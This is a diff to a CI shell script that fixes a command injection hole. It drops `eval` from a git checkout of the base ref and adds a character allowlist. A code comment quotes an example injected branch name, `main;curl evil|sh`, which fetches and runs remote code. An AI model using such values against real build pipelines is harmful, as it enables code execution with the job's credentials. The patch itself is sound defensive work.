@@ -29,11 +29,24 @@ if [ "$compare_with_base" = "true" ]; then
   fi
   echo "Comparing against base ref: $base_ref"
 
-  # Checkout base branch and run detection
-  eval git checkout "origin/$base_ref" 2>/dev/null || eval git checkout "$base_ref" 2>/dev/null || {
-    echo "Warning: could not checkout base ref '$base_ref', skipping comparison"
-    compare_with_base="false"
-  }
+  # Validate the ref before it reaches git: allow only plain branch/ref/SHA
+  # characters. This, together with dropping `eval` below, prevents a base branch
+  # named with shell metacharacters (e.g. `main;curl evil|sh`) from being
+  # re-interpreted as a command in this token-bearing job.
+  case "$base_ref" in
+    ""|*[!A-Za-z0-9._/-]*)
+      echo "Warning: base ref '$base_ref' contains unexpected characters, skipping comparison"
+      compare_with_base="false" ;;
+  esac
+
+  # Checkout base branch and run detection. No `eval`: the quoted expansion passes
+  # the ref to git as a single literal argument (a bad ref just fails the checkout).
+  if [ "$compare_with_base" = "true" ]; then
+    git checkout "origin/$base_ref" 2>/dev/null || git checkout "$base_ref" 2>/dev/null || {
+      echo "Warning: could not checkout base ref '$base_ref', skipping comparison"
+      compare_with_base="false"
+    }
+  fi
 
   if [ "$compare_with_base" = "true" ]; then
     echo "Running detection on base branch..."
